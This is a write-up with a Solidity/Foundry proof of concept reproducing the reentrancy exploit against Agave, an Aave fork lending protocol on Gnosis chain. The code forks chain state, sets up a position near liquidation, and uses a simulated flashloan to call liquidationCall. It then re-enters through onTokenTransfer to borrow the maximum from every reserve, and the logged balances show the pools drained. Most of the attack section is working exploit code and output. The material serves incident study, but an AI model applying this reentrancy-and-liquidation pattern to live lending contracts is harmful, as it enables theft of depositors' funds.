# Agave 

## What's Agave?

Agave ($AGVE) is a decentralized money market protocol on the xDai chain, developed by the 1Hive community as a fork of Aave. Agave integrates features from 1Hive projects like Celeste and Honeyswap.

Users deposit tokens, receiving 'aTokens' that accrue interest and can be used as collateral for borrowing. This enables leveraged returns with lower fees than mainnet Ethereum. Agave expands 1Hive's offerings, allowing users to earn yield on Honeyswap liquidity tokens. Explore Agave's capabilities, including lending, borrowing, delegated borrowing, and flash loans.

## Amount stolen

1.5 million USD

## Vurnebality

Reentrancy

## proof of concept (PoC) 

We begin by forking the contract state before initiating any hack, to create a replicated environment that mirrors the state of the smart contract at the time before the exploit happened

The code initializes variables related to the lending pool addresses provider, lending pool, and price oracle using the Gnosis forked state.

**`vm.startPrank`** is used to set an address as the **`msg.sender`**, by setting it to the gnosis bridge address we can simulate real transactions.
Finally, we establish the initial state of the contract by minting the original amounts of WETH and LINK tokens.


 
```solidity
   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.10;

   function setUp() public {
        vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
        providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
        lendingPool = ILendingPool(providerAddrs.getLendingPool());
        priceOracle = IPriceOracleGetter(providerAddrs.getPriceOracle());
        console.log(providerAddrs.getPriceOracle());

        //Lets just mint weth to this contract for initial debt
        vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d); //the gnosis bridge address.
        address aweth = 0xb5A165d9177555418796638447396377Edf4C18a; //Asset Address 
        wethLiqBeforeHack = getAvailableLiquidity(weth);

        //Mint initial weth funding
        WETH.mint(address(this), 2728.934387414251504146 ether);
        WETH.mint(address(this), 1);

        // Mint LINK funding
        LINK.mint(address(this), 1_000_000_000_000_000_100);
        vm.stopPrank();

        //Approve funds
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);
    }
```
```solidity
    function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
    }

    function getHealthFactor() public view returns (uint256) {
        (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
        return healthFactor;
    }
```


### Prepare Phase


#### Initial Condition - Health Factor Above 1

**Objective:** 
Ensure that the health factor is initially slightly above 1.

**Reasoning:**
The health factor is important in DeFi platforms, especially those involving lending and borrowing. It is a measure of an account's collateralization level, indicating the ratio of the value of assets to the value of outstanding liabilities. A health factor above 1 indicates that the account has sufficient collateral to cover its liabilities.

#### Transition - Advance Time by One Hour
**Objective:**
Advance time by one hour after the initial prepare.

**Reasoning**
This time advancement is part of a simulation scenario to trigger changes in the account's health factor or to simulate the passage of time, allowing for dynamic testing.

#### Liquidation Mechanism
A liquidation mechanism in place to protect the system from insolvency. When an account's health factor falls below 1, it may become eligible for liquidation.


#### Purpose -  Liquidation Call:

To get the health factor below 1, you would typically need to ensure that the borrowed amount exceeds the collateral value. The health factor is calculated based on the ratio of collateral to debt. If this ratio falls below 1, the health factor drops below the threshold, indicating potential insolvency.

- Deposit a large amount of LINK (1_000_000_000_000_000_100) into the lending pool, designating it as collateral

- Deposit a minimal amount of WETH (1) into the lending pool, designating it as collateral.

- Set both LINK and WETH as collateral assets in the lending pool, allowing them to be used as security for borrowing.

- Borrow a large amount of LINK (700_000_000_000_000_000) from the lending pool with a borrow factor of 2. The borrow factor influences the amount that can be borrowed relative to the collateral.

- Borrow a minimal amount of WETH (1) from the lending pool with a borrow factor of 2.

These actions collectively set up a scenario where you have a significant LINK debt compared to the collateral, leading to a health factor below 1. 


```solidity
  function prepare() public {
        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc

        uint256 balance = LINK.balanceOf(address(this));
        require(balance > 0, "no link");

        //Deposit weth to aave v2 fork
        lendingPool.deposit(link, 1_000_000_000_000_000_100, address(this), 0);
        lendingPool.deposit(weth, 1, address(this), 0);

        //Enable asset as collateral

        lendingPool.setUserUseReserveAsCollateral(link, true);
        lendingPool.setUserUseReserveAsCollateral(weth, true);

        //Borrow initial setup prepare debts
        lendingPool.borrow(link, 700_000_000_000_000_000, 2, 0, address(this));
        lendingPool.borrow(weth, 1, 2, 0, address(this));

        //Withdraw as per tx
        lendingPool.withdraw(link, linkWithdraw5, address(this));
    }
```


```solidity
 function testExploit() public {
        //Call prepare and get it setup
        prepare();
        _logBalances("Before hack balances");
        console.log("healthf : %d", getHealthFactor());
        flashloanFundingWETH();
        _logBalances("After hack balances");
    }
```



### Flashloan and Deposit Phase
   - Action: Execute a flashloan and deposit tokens.
   - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.


This function initiates a flashloan by calling **`uniswapV2Call`** with a specified amount of WETH (2730 ether). The actual flashloan logic is implemented in the **`attackLogic`** function.

```solidity
  function flashloanFundingWETH() internal {
        this.uniswapV2Call(address(this), 2730 ether, 0, new bytes(0));
    }
```
This function simulates a flashloan from Uniswap, passing control to the **`attackLogic`** function with the flashloan amount, another token amount, and additional data.
```solidity
  function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        //We simulate a flashloan from uniswap for initial eth funding
        attackLogic(_amount0, _amount1, _data);
    }
```

#### Flashloan Attack Logic

The `attackLogic` function orchestrates a flashloan-based attack on the Aave lending pool, exploiting vulnerabilities in the protocol. Here's a breakdown of its key steps:

1. **Calculate Flashloan Amount:**
   - Calculate the flashloan amount based on the received parameters (`_amount0` and `_amount1`).
   - Set the calculated amount as `totalBorrowed`.

2. **Adjust Block Timestamp and Number:**
   - Manipulate the block timestamp and number to simulate the passage of time, causing a decrease in the health factor.
   - This adjustment sets the stage for subsequent actions in the attack.

3. **Initiate Liquidation Call:**
   - Start a liquidation call on the WETH asset within the Aave lending pool.
   - This step triggers a reentrancy attack by initiating an `ontokentransfer` call on the `.burn` function of the aToken.

4. **Withdraw Funds from WETH Lending Pool:**
   - Execute a withdrawal from the WETH lending pool, securing control over the borrowed assets.

5. **Calculate Flashloan Repayment:**
   - Emulate the calculation of flashloan fees for a Uniswap V2 pair for continuity.
   - Ensure there is enough WETH to repay the flashloan, logging any remaining ETH if applicable.

6. **Repay Flashloan:**
   - Repay the flashloan by transferring WETH to `address(1)` to simulate a reduction in the flashloan amount.

```solidity
    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        // Calculate the flashloan amount and set it as totalBorrowed
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s WETH from Honey", totalBorrowed);

        // Adjust the block timestamp and number to simulate the passage of time, causing the health factor to decrease
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        console.log("healthfAfterAdjust : %d", getHealthFactor());

        // Initiate a liquidation call on the WETH asset,
        // This will start the reentrancy with ontokentransfer call on .burn of the atoken
        lendingPool.liquidationCall(weth, weth, address(this), 2, false);


        // Withdraw funds from the WETH lending pool
        lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));


        //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
        uint256 wethbal = WETH.balanceOf(address(this));
        uint256 remainingeth = wethbal > totalBorrowed ? 0 : totalBorrowed - wethbal;
        if (wethbal < totalBorrowed) {
            console.log("Remaining eth is %d", totalBorrowed - wethbal);
        }

        // Ensure there's enough WETH to repay the flashloan
        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");


    // For the test case, transfer WETH to address(1) to reduce the flashloan amount
        WETH.transfer(address(1), amountRepay);
        console.log("Repay Flashloan for : %s WETH", amountRepay / 1e18);
    }
    
```

This function is called externally when a token transfer occurs.
It monitors the transfer events, specifically for WETH tokens (aweth) with a value of 1, indicating a specific stage in the reentrancy attack.
After detecting the second occurrence of this event, it calls borrowMaxtokens to maximize borrowing.


```solidity
        function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        console.log("tokencall From: %s, Value: %d", _from, _value);
        //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
        if (_from == aweth && _value == 1) {
            calcount++;
        }
        if (calcount == 2 && _from == aweth && _value == 1) {
            borrowMaxtokens();
        }
    }
}

```


<details>
  <summary>maxBorrow Function</summary>

```solidity
function maxBorrow(address asset, bool maxxx) internal {
    IERC20 assetX = IERC20(asset);
    uint256 assetXbal = assetX.balanceOf(address(this));
    uint256 reserveTokenbal = getAvailableLiquidity(asset);
    console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
    uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
    if (BorrowAmount > 0) {
        console.log("Going to boorrow %d of asset %s", BorrowAmount, asset);
        lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
        uint256 diff = assetX.balanceOf(address(this)) - assetXbal;
        require(diff == BorrowAmount, "did not borrow any funds");
        console.log("borrowed %d successfully", BorrowAmount);
    } else {
        console.log("NO amount borrowed???");
    }
}
```



```solidity
        function getMaxBorrow(address asset, uint256 depositedamt) public view returns (uint256) {
        // Get the LTV (Loan To Value) of the asset from the Aave Protocol
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        uint256 ltv = data.configuration.data & 0xFFFF;

        // Get the latest price of the WETH token from the Aave Oracle
        uint256 wethPrice = priceOracle.getAssetPrice(address(weth));
        console.log(ltv);

        // Adjust for token decimals
        uint256 totalCollateralValueInEth = (depositedamt * wethPrice) / (10 ** 18); // normalize the deposited amount to ETH

        // Calculate the maximum borrowable value
        uint256 maxBorrowValueInEth = (totalCollateralValueInEth * ltv) / 10_000; // LTV is scaled by a factor of 10000

        // Get the latest price of the borrowable asset from the Aave Oracle
        uint256 assetPriceInEth = priceOracle.getAssetPrice(asset);

        // Calculate the maximum borrowable amount, adjust it back to the borrowing asset's decimals
        uint256 maxBorrowAmount = (maxBorrowValueInEth * (10 ** 18)) / assetPriceInEth;
        uint256 scaleDownAmt =
            WETH.decimals() > IERC20(asset).decimals() ? WETH.decimals() - IERC20(asset).decimals() : 0;
        if (scaleDownAmt > 0) {
            return ((maxBorrowAmount / 10 ** scaleDownAmt) * 100) / 100;
        }
        return (maxBorrowAmount * 100) / 100;
    }
```
</details>


### Exploit Completion:
Successful execution drains funds from the lending pool.




```solidity
  Before hack balances
  --- Start of balances --- 
  WETH Balance 2728934387414251504147
  aWETH Balance 1
  USDC Balance 0
  GNO Balance 0
  LINK Balance 766666666660000000
  WBTC Balance 0
  healthf : 1000000000007142895
  --- End of balances --- 



 After hack balances
  --- Start of balances --- 
  WETH Balance 567741240183600637391
  aWETH Balance 0
  USDC Balance 243667634985
  GNO Balance 8408675281445177303948
  LINK Balance 24588008766918391786643
  WBTC Balance 1678601870
  healthf : 1665963675123
  --- End of balances --- 

```
